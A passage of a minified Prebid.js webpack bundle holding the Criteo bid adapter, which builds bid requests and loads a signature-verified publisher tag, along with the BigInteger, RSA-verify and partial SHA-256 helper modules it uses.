    "use strict";

    Object.defineProperty(__webpack_exports__, "__esModule", {
      value: !0
    }), __webpack_require__.d(__webpack_exports__, "ADAPTER_VERSION", function () {
      return ADAPTER_VERSION;
    }), __webpack_require__.d(__webpack_exports__, "PROFILE_ID_PUBLISHERTAG", function () {
      return PROFILE_ID_PUBLISHERTAG;
    }), __webpack_require__.d(__webpack_exports__, "FAST_BID_VERSION_CURRENT", function () {
      return FAST_BID_VERSION_CURRENT;
    }), __webpack_require__.d(__webpack_exports__, "spec", function () {
      return spec;
    }), __webpack_exports__.canFastBid = canFastBid, __webpack_exports__.getFastBidUrl = getFastBidUrl, __webpack_exports__.tryGetCriteoFastBid = tryGetCriteoFastBid;
    var __WEBPACK_IMPORTED_MODULE_0__src_utils_js__ = __webpack_require__(0),
      __WEBPACK_IMPORTED_MODULE_1__src_adloader_js__ = __webpack_require__(21),
      __WEBPACK_IMPORTED_MODULE_2__src_adapters_bidderFactory_js__ = __webpack_require__(1),
      __WEBPACK_IMPORTED_MODULE_3__src_config_js__ = __webpack_require__(3),
      __WEBPACK_IMPORTED_MODULE_4__src_mediaTypes_js__ = __webpack_require__(2),
      __WEBPACK_IMPORTED_MODULE_5_prebidjs_polyfill_find_js__ = __webpack_require__(11),
      __WEBPACK_IMPORTED_MODULE_5_prebidjs_polyfill_find_js___default = __webpack_require__.n(__WEBPACK_IMPORTED_MODULE_5_prebidjs_polyfill_find_js__),
      __WEBPACK_IMPORTED_MODULE_6_criteo_direct_rsa_validate_build_verify_js__ = __webpack_require__(34),
      __WEBPACK_IMPORTED_MODULE_6_criteo_direct_rsa_validate_build_verify_js___default = __webpack_require__.n(__WEBPACK_IMPORTED_MODULE_6_criteo_direct_rsa_validate_build_verify_js__),
      __WEBPACK_IMPORTED_MODULE_7__src_storageManager_js__ = __webpack_require__(7);
    function _extends() {
      return (_extends = Object.assign || function (t) {
        for (var e = 1; e < arguments.length; e++) {
          var r = arguments[e];
          for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (t[i] = r[i]);
        }
        return t;
      }).apply(this, arguments);
    }
    var GVLID = 91,
      ADAPTER_VERSION = 34,
      BIDDER_CODE = "criteo",
      CDB_ENDPOINT = "https://bidder.criteo.com/cdb",
      PROFILE_ID_INLINE = 207,
      PROFILE_ID_PUBLISHERTAG = 185,
      storage = Object(__WEBPACK_IMPORTED_MODULE_7__src_storageManager_js__.b)(GVLID),
      LOG_PREFIX = "Criteo: ",
      FAST_BID_VERSION_PLACEHOLDER = "%FAST_BID_VERSION%",
      FAST_BID_VERSION_CURRENT = 117,
      FAST_BID_VERSION_LATEST = "latest",
      FAST_BID_VERSION_NONE = "none",
      PUBLISHER_TAG_URL_TEMPLATE = "https://static.criteo.net/js/ld/publishertag.prebid" + FAST_BID_VERSION_PLACEHOLDER + ".js",
      FAST_BID_PUBKEY_E = 65537,
      FAST_BID_PUBKEY_N = "ztQYwCE5BU7T9CDM5he6rKoabstXRmkzx54zFPZkWbK530dwtLBDeaWBMxHBUT55CYyboR/EZ4efghPi3CoNGfGWezpjko9P6p2EwGArtHEeS4slhu/SpSIFMjG6fdrpRoNuIAMhq1Z+Pr/+HOd1pThFKeGFr2/NhtAg+TXAzaU=",
      spec = {
        code: BIDDER_CODE,
        gvlid: GVLID,
        supportedMediaTypes: [__WEBPACK_IMPORTED_MODULE_4__src_mediaTypes_js__.b, __WEBPACK_IMPORTED_MODULE_4__src_mediaTypes_js__.d, __WEBPACK_IMPORTED_MODULE_4__src_mediaTypes_js__.c],
        isBidRequestValid: function (t) {
          return !(!t || !t.params || !t.params.zoneId && !t.params.networkId) && !(hasVideoMediaType(t) && !hasValidVideoMediaType(t));
        },
        buildRequests: function (t, e) {
          var r,
            i,
            s = __WEBPACK_IMPORTED_MODULE_3__src_config_js__.b.getLegacyFpd(__WEBPACK_IMPORTED_MODULE_3__src_config_js__.b.getConfig("ortb2")) || {};
          _extends(e, {
            publisherExt: s.context,
            userExt: s.user,
            ceh: __WEBPACK_IMPORTED_MODULE_3__src_config_js__.b.getConfig("criteo.ceh")
          });
          var a = __WEBPACK_IMPORTED_MODULE_3__src_config_js__.b.getConfig("criteo.fastBidVersion"),
            _ = canFastBid(a);
          if (!publisherTagAvailable() && _) {
            window.Criteo = window.Criteo || {}, window.Criteo.usePrebidEvents = !1, tryGetCriteoFastBid();
            var o = getFastBidUrl(a);
            setTimeout(function () {
              Object(__WEBPACK_IMPORTED_MODULE_1__src_adloader_js__.a)(o, BIDDER_CODE);
            }, e.timeout);
          }
          if (publisherTagAvailable()) {
            var n = new Criteo.PubTag.Adapters.Prebid(PROFILE_ID_PUBLISHERTAG, ADAPTER_VERSION, t, e, "6.10.0-pre");
            r = n.buildCdbUrl(), i = n.buildCdbRequest();
          } else {
            var c = buildContext(t, e);
            r = buildCdbUrl(c), i = buildCdbRequest(c, t, e);
          }
          if (i) return {
            method: "POST",
            url: r,
            data: i,
            bidRequests: t
          };
        },
        interpretResponse: function (t, e) {
          var r = t.body || t;
          if (publisherTagAvailable()) {
            var i = Criteo.PubTag.Adapters.Prebid.GetAdapter(e);
            if (i) return i.interpretResponse(r, e);
          }
          var s = [];
          return r && r.slots && Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.isArray)(r.slots) && r.slots.forEach(function (t) {
            var r = __WEBPACK_IMPORTED_MODULE_5_prebidjs_polyfill_find_js___default()(e.bidRequests, function (e) {
                return e.adUnitCode === t.impid && (!e.params.zoneId || parseInt(e.params.zoneId) === t.zoneid);
              }),
              i = r.bidId,
              a = {
                requestId: i,
                adId: t.bidId || Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.getUniqueIdentifierStr)(),
                cpm: t.cpm,
                currency: t.currency,
                netRevenue: !0,
                ttl: t.ttl || 60,
                creativeId: t.creativecode,
                width: t.width,
                height: t.height,
                dealId: t.dealCode
              };
            t.adomain && (a.meta = _extends({}, a.meta, {
              advertiserDomains: t.adomain
            })), t.native ? r.params.nativeCallback ? a.ad = createNativeAd(i, t.native, r.params.nativeCallback) : (a.native = createPrebidNativeAd(t.native), a.mediaType = __WEBPACK_IMPORTED_MODULE_4__src_mediaTypes_js__.c) : t.video ? (a.vastUrl = t.displayurl, a.mediaType = __WEBPACK_IMPORTED_MODULE_4__src_mediaTypes_js__.d) : a.ad = t.creative, s.push(a);
          }), s;
        },
        onTimeout: function (t) {
          if (publisherTagAvailable() && Array.isArray(t)) {
            var e = [];
            t.forEach(function (t) {
              -1 === e.indexOf(t.auctionId) && (e.push(t.auctionId), Criteo.PubTag.Adapters.Prebid.GetAdapter(t.auctionId).handleBidTimeout());
            });
          }
        },
        onBidWon: function (t) {
          publisherTagAvailable() && t && Criteo.PubTag.Adapters.Prebid.GetAdapter(t.auctionId).handleBidWon(t);
        },
        onSetTargeting: function (t) {
          publisherTagAvailable() && Criteo.PubTag.Adapters.Prebid.GetAdapter(t.auctionId).handleSetTargeting(t);
        }
      };
    function publisherTagAvailable() {
      return "undefined" != typeof Criteo && Criteo.PubTag && Criteo.PubTag.Adapters && Criteo.PubTag.Adapters.Prebid;
    }
    function buildContext(t, e) {
      var r = "";
      e && e.refererInfo && (r = e.refererInfo.referer);
      var i = Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.parseUrl)(r).search,
        s = {
          url: r,
          debug: "1" === i.pbt_debug,
          noLog: "1" === i.pbt_nolog,
          amp: !1
        };
      return t.forEach(function (t) {
        "amp" === t.params.integrationMode && (s.amp = !0);
      }), s;
    }
    function buildCdbUrl(t) {
      var e = CDB_ENDPOINT;
      return e += "?profileId=" + PROFILE_ID_INLINE, e += "&av=" + String(ADAPTER_VERSION), e += "&wv=" + encodeURIComponent("6.10.0-pre"), e += "&cb=" + String(Math.floor(99999999999 * Math.random())), t.amp && (e += "&im=1"), t.debug && (e += "&debug=1"), t.noLog && (e += "&nolog=1"), e;
    }
    function checkNativeSendId(t) {
      return !(t.nativeParams && (t.nativeParams.image && (!0 !== t.nativeParams.image.sendId || !0 === t.nativeParams.image.sendTargetingKeys) || t.nativeParams.icon && (!0 !== t.nativeParams.icon.sendId || !0 === t.nativeParams.icon.sendTargetingKeys) || t.nativeParams.clickUrl && (!0 !== t.nativeParams.clickUrl.sendId || !0 === t.nativeParams.clickUrl.sendTargetingKeys) || t.nativeParams.displayUrl && (!0 !== t.nativeParams.displayUrl.sendId || !0 === t.nativeParams.displayUrl.sendTargetingKeys) || t.nativeParams.privacyLink && (!0 !== t.nativeParams.privacyLink.sendId || !0 === t.nativeParams.privacyLink.sendTargetingKeys) || t.nativeParams.privacyIcon && (!0 !== t.nativeParams.privacyIcon.sendId || !0 === t.nativeParams.privacyIcon.sendTargetingKeys)));
    }
    function buildCdbRequest(t, e, r) {
      var i,
        s,
        a = {
          publisher: {
            url: t.url,
            ext: r.publisherExt
          },
          slots: e.map(function (t) {
            i = t.params.networkId || i, s = t.schain || s;
            var e = {
              impid: t.adUnitCode,
              transactionid: t.transactionId,
              auctionId: t.auctionId
            };
            if (t.params.zoneId && (e.zoneid = t.params.zoneId), Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.deepAccess)(t, "ortb2Imp.ext") && (e.ext = t.ortb2Imp.ext), t.params.ext && (e.ext = _extends({}, e.ext, t.params.ext)), t.params.publisherSubId && (e.publishersubid = t.params.publisherSubId), t.params.nativeCallback || Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.deepAccess)(t, "mediaTypes.".concat(__WEBPACK_IMPORTED_MODULE_4__src_mediaTypes_js__.c)) ? (e.native = !0, checkNativeSendId(t) || Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.logWarn)(LOG_PREFIX + "all native assets containing URL should be sent as placeholders with sendId(icon, image, clickUrl, displayUrl, privacyLink, privacyIcon)"), e.sizes = parseSizes(retrieveBannerSizes(t), parseNativeSize)) : e.sizes = parseSizes(retrieveBannerSizes(t), parseSize), hasVideoMediaType(t)) {
              var r = {
                  playersizes: parseSizes(Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.deepAccess)(t, "mediaTypes.video.playerSize"), parseSize),
                  mimes: t.mediaTypes.video.mimes,
                  protocols: t.mediaTypes.video.protocols,
                  maxduration: t.mediaTypes.video.maxduration,
                  api: t.mediaTypes.video.api,
                  skip: t.mediaTypes.video.skip,
                  placement: t.mediaTypes.video.placement,
                  minduration: t.mediaTypes.video.minduration,
                  playbackmethod: t.mediaTypes.video.playbackmethod,
                  startdelay: t.mediaTypes.video.startdelay
                },
                a = t.params.video;
              void 0 !== a && (r.skip = r.skip || a.skip || 0, r.placement = r.placement || a.placement, r.minduration = r.minduration || a.minduration, r.playbackmethod = r.playbackmethod || a.playbackmethod, r.startdelay = r.startdelay || a.startdelay || 0), e.video = r;
            }
            return e;
          })
        };
      return i && (a.publisher.networkid = i), s && (a.source = {
        ext: {
          schain: s
        }
      }), a.user = {
        ext: r.userExt
      }, r && r.ceh && (a.user.ceh = r.ceh), r && r.gdprConsent && (a.gdprConsent = {}, void 0 !== r.gdprConsent.gdprApplies && (a.gdprConsent.gdprApplies = !!r.gdprConsent.gdprApplies), a.gdprConsent.version = r.gdprConsent.apiVersion, void 0 !== r.gdprConsent.consentString && (a.gdprConsent.consentData = r.gdprConsent.consentString)), r && r.uspConsent && (a.user.uspIab = r.uspConsent), a;
    }
    function retrieveBannerSizes(t) {
      return Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.deepAccess)(t, "mediaTypes.banner.sizes") || t.sizes;
    }
    function parseSizes(t, e) {
      return Array.isArray(t[0]) ? t.map(function (t) {
        return e(t);
      }) : [e(t)];
    }
    function parseSize(t) {
      return t[0] + "x" + t[1];
    }
    function parseNativeSize(t) {
      return void 0 === t[0] && void 0 === t[1] ? "2x2" : t[0] + "x" + t[1];
    }
    function hasVideoMediaType(t) {
      return void 0 !== Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.deepAccess)(t, "mediaTypes.video");
    }
    function hasValidVideoMediaType(t) {
      var e = !0;
      if (["mimes", "playerSize", "maxduration", "protocols", "api", "skip", "placement", "playbackmethod"].forEach(function (r) {
        void 0 === Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.deepAccess)(t, "mediaTypes.video." + r) && void 0 === Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.deepAccess)(t, "params.video." + r) && (e = !1, Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.logError)("Criteo Bid Adapter: mediaTypes.video." + r + " is required"));
      }), e) {
        var r = t.mediaTypes.video.placement || t.params.video.placement;
        if ("instream" == t.mediaTypes.video.context && 1 === r) return !0;
        if ("outstream" == t.mediaTypes.video.context && 1 !== r) return !0;
      }
      return !1;
    }
    function createPrebidNativeAd(t) {
      return {
        sendTargetingKeys: !1,
        title: t.products[0].title,
        body: t.products[0].description,
        sponsoredBy: t.advertiser.description,
        icon: t.advertiser.logo,
        image: t.products[0].image,
        clickUrl: t.products[0].click_url,
        privacyLink: t.privacy.optout_click_url,
        privacyIcon: t.privacy.optout_image_url,
        cta: t.products[0].call_to_action,
        price: t.products[0].price,
        impressionTrackers: t.impression_pixels.map(function (t) {
          return t.url;
        })
      };
    }
    function createNativeAd(t, e, r) {
      var i = "criteo_prebid_native_slots";
      return window[i] = window[i] || {}, window[i][t] = {
        callback: r,
        payload: e
      }, '\n<script type="text/javascript">\nfor (var i = 0; i < 10; ++i) {\n var slots = window.parent.'.concat(i, ';\n  if(!slots){continue;}\n  var responseSlot = slots["').concat(t, '"];\n  responseSlot.callback(responseSlot.payload);\n  break;\n}\n<\/script>');
    }
    function canFastBid(t) {
      return t !== FAST_BID_VERSION_NONE;
    }
    function getFastBidUrl(t) {
      var e;
      if (t === FAST_BID_VERSION_LATEST) e = "";else if (t) {
        String(t).split(".")[0] < 102 && Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.logWarn)("Specifying a Fastbid version which is not supporting version selection."), e = "." + t;
      } else e = "." + FAST_BID_VERSION_CURRENT;
      return PUBLISHER_TAG_URL_TEMPLATE.replace(FAST_BID_VERSION_PLACEHOLDER, e);
    }
    function tryGetCriteoFastBid() {
      try {
        var fastBidStorageKey = "criteo_fast_bid",
          hashPrefix = "// Hash: ",
          fastBidFromStorage = storage.getDataFromLocalStorage(fastBidStorageKey);
        if (null !== fastBidFromStorage) {
          var firstLineEndPosition = fastBidFromStorage.indexOf("\n"),
            firstLine = fastBidFromStorage.substr(0, firstLineEndPosition).trim();
          if (firstLine.substr(0, hashPrefix.length) !== hashPrefix) Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.logWarn)("No hash found in FastBid"), storage.removeDataFromLocalStorage(fastBidStorageKey);else {
            var publisherTagHash = firstLine.substr(hashPrefix.length),
              publisherTag = fastBidFromStorage.substr(firstLineEndPosition + 1);
            Object(__WEBPACK_IMPORTED_MODULE_6_criteo_direct_rsa_validate_build_verify_js__.verify)(publisherTag, publisherTagHash, FAST_BID_PUBKEY_N, FAST_BID_PUBKEY_E) ? (Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.logInfo)("Using Criteo FastBid"), eval(publisherTag)) : (Object(__WEBPACK_IMPORTED_MODULE_0__src_utils_js__.logWarn)("Invalid Criteo FastBid found"), storage.removeDataFromLocalStorage(fastBidStorageKey));
          }
        }
      } catch (t) {}
    }
    Object(__WEBPACK_IMPORTED_MODULE_2__src_adapters_bidderFactory_js__.registerBidder)(spec), window.pbjs.installedModules.push("criteoBidAdapter");
  },
  34: function (t, e, r) {
    "use strict";

    Object.defineProperty(e, "__esModule", {
      value: !0
    });
    var i = r(35),
      s = r(36);
    e.verify = function (t, e, r, a) {
      var _ = new i.BigInteger(i.b64toHex(e)),
        o = new i.BigInteger(i.b64toHex(r)),
        n = _.modPowInt(a, o);
      return i.removeExtraSymbols(n.toHexString()) === s.Sha256.hash(t);
    };
  },
  35: function (t, e, r) {
    "use strict";

    var i;
    Object.defineProperty(e, "__esModule", {
      value: !0
    });
    var s = function () {
      function t(t) {
        null !== t && this.fromHexString(t);
      }
      return t.prototype.toHexString = function () {
        if (this.s < 0) return "-" + this.negate().toHexString();
        var t,
          e = !1,
          r = "",
          i = this.t,
          s = this.DB - i * this.DB % 4;
        if (i-- > 0) for (s < this.DB && (t = this[i] >> s) > 0 && (e = !0, r = d(t)); i >= 0;) s < 4 ? (t = (this[i] & (1 << s) - 1) << 4 - s, t |= this[--i] >> (s += this.DB - 4)) : (t = this[i] >> (s -= 4) & 15, s <= 0 && (s += this.DB, --i)), t > 0 && (e = !0), e && (r += d(t));
        return e ? r : "0";
      }, t.prototype.fromHexString = function (e) {
        if (null !== e) {
          this.t = 0, this.s = 0;
          for (var r = e.length, i = !1, s = 0; --r >= 0;) {
            var a = p(e, r);
            a < 0 ? "-" == e.charAt(r) && (i = !0) : (i = !1, 0 == s ? this[this.t++] = a : s + 4 > this.DB ? (this[this.t - 1] |= (a & (1 << this.DB - s) - 1) << s, this[this.t++] = a >> this.DB - s) : this[this.t - 1] |= a << s, (s += 4) >= this.DB && (s -= this.DB));
          }
          0, this.clamp(), i && t.ZERO.subTo(this, this);
        }
      }, t.prototype.negate = function () {
        var e = a();
        return t.ZERO.subTo(this, e), e;
      }, t.prototype.abs = function () {
        return this.s < 0 ? this.negate() : this;
      }, t.prototype.mod = function (e) {
        var r = a();
        return this.abs().divRemTo(e, null, r), this.s < 0 && r.compareTo(t.ZERO) > 0 && e.subTo(r, r), r;
      }, t.prototype.copyTo = function (t) {
        for (var e = this.t - 1; e >= 0; --e) t[e] = this[e];
        t.t = this.t, t.s = this.s;
      }, t.prototype.lShiftTo = function (t, e) {
        for (var r = t % this.DB, i = this.DB - r, s = (1 << i) - 1, a = Math.floor(t / this.DB), _ = this.s << r & this.DM, o = this.t - 1; o >= 0; --o) e[o + a + 1] = this[o] >> i | _, _ = (this[o] & s) << r;
        for (o = a - 1; o >= 0; --o) e[o] = 0;
        e[a] = _, e.t = this.t + a + 1, e.s = this.s, e.clamp();
      }, t.prototype.invDigit = function () {
        if (this.t < 1) return 0;
        var t = this[0];
        if (0 == (1 & t)) return 0;
        var e = 3 & t;
        return (e = (e = (e = (e = e * (2 - (15 & t) * e) & 15) * (2 - (255 & t) * e) & 255) * (2 - ((65535 & t) * e & 65535)) & 65535) * (2 - t * e % this.DV) % this.DV) > 0 ? this.DV - e : -e;
      }, t.prototype.dlShiftTo = function (t, e) {
        var r;
        for (r = this.t - 1; r >= 0; --r) e[r + t] = this[r];
        for (r = t - 1; r >= 0; --r) e[r] = 0;
        e.t = this.t + t, e.s = this.s;
      }, t.prototype.squareTo = function (t) {
        for (var e = this.abs(), r = t.t = 2 * e.t; --r >= 0;) t[r] = 0;
        for (r = 0; r < e.t - 1; ++r) {
          var i = e.am(r, e[r], t, 2 * r, 0, 1);
          (t[r + e.t] += e.am(r + 1, 2 * e[r], t, 2 * r + 1, i, e.t - r - 1)) >= e.DV && (t[r + e.t] -= e.DV, t[r + e.t + 1] = 1);
        }
        t.t > 0 && (t[t.t - 1] += e.am(r, e[r], t, 2 * r, 0, 1)), t.s = 0, t.clamp();
      }, t.prototype.multiplyTo = function (e, r) {
        var i = this.abs(),
          s = e.abs(),
          a = i.t;
        for (r.t = a + s.t; --a >= 0;) r[a] = 0;
        for (a = 0; a < s.t; ++a) r[a + i.t] = i.am(0, s[a], r, a, 0, i.t);
        r.s = 0, r.clamp(), this.s != e.s && t.ZERO.subTo(r, r);
      }, t.prototype.divRemTo = function (e, r, i) {
        var s = e.abs();
        if (!(s.t <= 0)) {
          var o = this.abs();
          if (o.t < s.t) return null != r && r.fromHexString("0"), void (null != i && this.copyTo(i));
          null == i && (i = a());
          var n = a(),
            c = this.s,
            p = e.s,
            d = this.DB - _(s[s.t - 1]);
          d > 0 ? (s.lShiftTo(d, n), o.lShiftTo(d, i)) : (s.copyTo(n), o.copyTo(i));
          var u = n.t,
            l = n[u - 1];
          if (0 != l) {
            var h = l * (1 << this.F1) + (u > 1 ? n[u - 2] >> this.F2 : 0),
              f = this.FV / h,
              E = (1 << this.F1) / h,
              v = 1 << this.F2,
              m = i.t,
              T = m - u,
              b = null == r ? a() : r;
            for (n.dlShiftTo(T, b), i.compareTo(b) >= 0 && (i[i.t++] = 1, i.subTo(b, i)), t.ONE.dlShiftTo(u, b), b.subTo(n, n); n.t < u;) n[n.t++] = 0;
            for (; --T >= 0;) {
              var D = i[--m] == l ? this.DM : Math.floor(i[m] * f + (i[m - 1] + v) * E);
              if ((i[m] += n.am(0, D, i, T, 0, u)) < D) for (n.dlShiftTo(T, b), i.subTo(b, i); i[m] < --D;) i.subTo(b, i);
            }
            null != r && (i.drShiftTo(u, r), c != p && t.ZERO.subTo(r, r)), i.t = u, i.clamp(), d > 0 && i.rShiftTo(d, i), c < 0 && t.ZERO.subTo(i, i);
          }
        }
      }, t.prototype.rShiftTo = function (t, e) {
        e.s = this.s;
        var r = Math.floor(t / this.DB);
        if (r >= this.t) e.t = 0;else {
          var i = t % this.DB,
            s = this.DB - i,
            a = (1 << i) - 1;
          e[0] = this[r] >> i;
          for (var _ = r + 1; _ < this.t; ++_) e[_ - r - 1] |= (this[_] & a) << s, e[_ - r] = this[_] >> i;
          i > 0 && (e[this.t - r - 1] |= (this.s & a) << s), e.t = this.t - r, e.clamp();
        }
      }, t.prototype.drShiftTo = function (t, e) {
        for (var r = t; r < this.t; ++r) e[r - t] = this[r];
        e.t = Math.max(this.t - t, 0), e.s = this.s;
      }, t.prototype.subTo = function (t, e) {
        for (var r = 0, i = 0, s = Math.min(t.t, this.t); r < s;) i += this[r] - t[r], e[r++] = i & this.DM, i >>= this.DB;
        if (t.t < this.t) {
          for (i -= t.s; r < this.t;) i += this[r], e[r++] = i & this.DM, i >>= this.DB;
          i += this.s;
        } else {
          for (i += this.s; r < t.t;) i -= t[r], e[r++] = i & this.DM, i >>= this.DB;
          i -= t.s;
        }
        e.s = i < 0 ? -1 : 0, i < -1 ? e[r++] = this.DV + i : i > 0 && (e[r++] = i), e.t = r, e.clamp();
      }, t.prototype.clamp = function () {
        for (var t = this.s & this.DM; this.t > 0 && this[this.t - 1] == t;) --this.t;
      }, t.prototype.modPowInt = function (t, e) {
        var r;
        return r = t < 256 || e.isEven() ? new u(e) : new l(e), this.exp(t, r);
      }, t.prototype.exp = function (e, r) {
        if (e > 4294967295 || e < 1) return t.ONE;
        var i = a(),
          s = a(),
          o = r.convert(this),
          n = _(e) - 1;
        for (o.copyTo(i); --n >= 0;) if (r.sqrTo(i, s), (e & 1 << n) > 0) r.mulTo(s, o, i);else {
          var c = i;
          i = s, s = c;
        }
        return r.revert(i);
      }, t.prototype.isEven = function () {
        return 0 == (this.t > 0 ? 1 & this[0] : this.s);
      }, t.prototype.compareTo = function (t) {
        var e = this.s - t.s;
        if (0 != e) return e;
        var r = this.t;
        if (0 != (e = r - t.t)) return this.s < 0 ? -e : e;
        for (; --r >= 0;) if (0 != (e = this[r] - t[r])) return e;
        return 0;
      }, t.prototype.am1 = function (t, e, r, i, s, a) {
        for (; --a >= 0;) {
          var _ = e * this[t++] + r[i] + s;
          s = Math.floor(_ / 67108864), r[i++] = 67108863 & _;
        }
        return s;
      }, t.prototype.am2 = function (t, e, r, i, s, a) {
        for (var _ = 32767 & e, o = e >> 15; --a >= 0;) {
          var n = 32767 & this[t],
            c = this[t++] >> 15,
            p = o * n + c * _;
          s = ((n = _ * n + ((32767 & p) << 15) + r[i] + (1073741823 & s)) >>> 30) + (p >>> 15) + o * c + (s >>> 30), r[i++] = 1073741823 & n;
        }
        return s;
      }, t.prototype.am3 = function (t, e, r, i, s, a) {
        for (var _ = 16383 & e, o = e >> 14; --a >= 0;) {
          var n = 16383 & this[t],
            c = this[t++] >> 14,
            p = o * n + c * _;
          s = ((n = _ * n + ((16383 & p) << 14) + r[i] + s) >> 28) + (p >> 14) + o * c, r[i++] = 268435455 & n;
        }
        return s;
      }, t;
    }();
    function a() {
      return new s(null);
    }
    function _(t) {
      var e,
        r = 1;
      return 0 != (e = t >>> 16) && (t = e, r += 16), 0 != (e = t >> 8) && (t = e, r += 8), 0 != (e = t >> 4) && (t = e, r += 4), 0 != (e = t >> 2) && (t = e, r += 2), 0 != (e = t >> 1) && (t = e, r += 1), r;
    }
    e.BigInteger = s, e.nbi = a, e.nbits = _;
    var o,
      n,
      c = [];
    for (o = "0".charCodeAt(0), n = 0; n <= 9; ++n) c[o++] = n;
    for (o = "a".charCodeAt(0), n = 10; n < 36; ++n) c[o++] = n;
    for (o = "A".charCodeAt(0), n = 10; n < 36; ++n) c[o++] = n;
    function p(t, e) {
      var r = c[t.charCodeAt(e)];
      return null == r ? -1 : r;
    }
    e.intAt = p;
    function d(t) {
      return "0123456789abcdefghijklmnopqrstuvwxyz".charAt(t);
    }
    e.int2char = d;
    e.b64toHex = function (t) {
      var e,
        r = "",
        i = 0,
        s = 0;
      for (e = 0; e < t.length && "=" != t.charAt(e); ++e) {
        var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(t.charAt(e));
        a < 0 || (0 == i ? (r += d(a >> 2), s = 3 & a, i = 1) : 1 == i ? (r += d(s << 2 | a >> 4), s = 15 & a, i = 2) : 2 == i ? (r += d(s), r += d(a >> 2), s = 3 & a, i = 3) : (r += d(s << 2 | a >> 4), r += d(15 & a), i = 0));
      }
      return 1 == i && (r += d(s << 2)), r;
    }, e.removeExtraSymbols = function (t) {
      return t.replace(/^1f+00/, "").replace("3031300d060960864801650304020105000420", "");
    };
    var u = function () {
        function t(t) {
          this.m = t;
        }
        return t.prototype.convert = function (t) {
          return t.s < 0 || t.compareTo(this.m) >= 0 ? t.mod(this.m) : t;
        }, t.prototype.revert = function (t) {
          return t;
        }, t.prototype.reduce = function (t) {
          t.divRemTo(this.m, null, t);
        }, t.prototype.mulTo = function (t, e, r) {
          t.multiplyTo(e, r), this.reduce(r);
        }, t.prototype.sqrTo = function (t, e) {
          t.squareTo(e), this.reduce(e);
        }, t;
      }(),
      l = function () {
        function t(t) {
          this.m = t, this.mp = t.invDigit(), this.mpl = 32767 & this.mp, this.mph = this.mp >> 15, this.um = (1 << t.DB - 15) - 1, this.mt2 = 2 * t.t;
        }
        return t.prototype.convert = function (t) {
          var e = a();
          return t.abs().dlShiftTo(this.m.t, e), e.divRemTo(this.m, null, e), t.s < 0 && e.compareTo(s.ZERO) > 0 && this.m.subTo(e, e), e;
        }, t.prototype.revert = function (t) {
          var e = a();
          return t.copyTo(e), this.reduce(e), e;
        }, t.prototype.reduce = function (t) {
          for (; t.t <= this.mt2;) t[t.t++] = 0;
          for (var e = 0; e < this.m.t; ++e) {
            var r = 32767 & t[e],
              i = r * this.mpl + ((r * this.mph + (t[e] >> 15) * this.mpl & this.um) << 15) & t.DM;
            for (t[r = e + this.m.t] += this.m.am(0, i, t, e, 0, this.m.t); t[r] >= t.DV;) t[r] -= t.DV, t[++r]++;
          }
          t.clamp(), t.drShiftTo(this.m.t, t), t.compareTo(this.m) >= 0 && t.subTo(this.m, t);
        }, t.prototype.mulTo = function (t, e, r) {
          t.multiplyTo(e, r), this.reduce(r);
        }, t.prototype.sqrTo = function (t, e) {
          t.squareTo(e), this.reduce(e);
        }, t;
      }();
    function h(t) {
      var e = a();
      return e.fromHexString(t.toString()), e;
    }
    e.nbv = h, s.ZERO = h(0), s.ONE = h(1), "Microsoft Internet Explorer" == navigator.appName ? (s.prototype.am = s.prototype.am2, i = 30) : "Netscape" != navigator.appName ? (s.prototype.am = s.prototype.am1, i = 26) : (s.prototype.am = s.prototype.am3, i = 28), s.prototype.DB = i, s.prototype.DM = (1 << i) - 1, s.prototype.DV = 1 << i;
    s.prototype.FV = Math.pow(2, 52), s.prototype.F1 = 52 - i, s.prototype.F2 = 2 * i - 52;
  },
  36: function (t, e, r) {
    "use strict";

    Object.defineProperty(e, "__esModule", {
      value: !0
    });
    var i = function () {
      function t() {}
      return t.hash = function (e) {
        e = t.utf8Encode(e || "");
        for (var r = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298], i = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225], s = (e += String.fromCharCode(128)).length / 4 + 2, a = Math.ceil(s / 16), _ = new Array(a), o = 0; o < a; o++) {
          _[o] = new Array(16);
          for (var n = 0; n < 16; n++) _[o][n] = e.charCodeAt(64 * o + 4 * n) << 24 | e.charCodeAt(64 * o + 4 * n + 1) << 16 | e.charCodeAt(64 * o + 4 * n + 2) << 8 | e.charCodeAt(64 * o + 4 * n + 3) << 0;
        }
        var c = 8 * (e.length - 1) / Math.pow(2, 32),
          p = 8 * (e.length - 1) >>> 0;
        _[a - 1][14] = Math.floor(c), _[a - 1][15] = p;
        for (o = 0; o < a; o++) {
          for (var d = new Array(64), u = 0; u < 16; u++) d[u] = _[o][u];
          for (u = 16; u < 64; u++) d[u] = t.q1(d[u - 2]) + d[u - 7] + t.q0(d[u - 15]) + d[u - 16] >>> 0;
          var l = i[0],
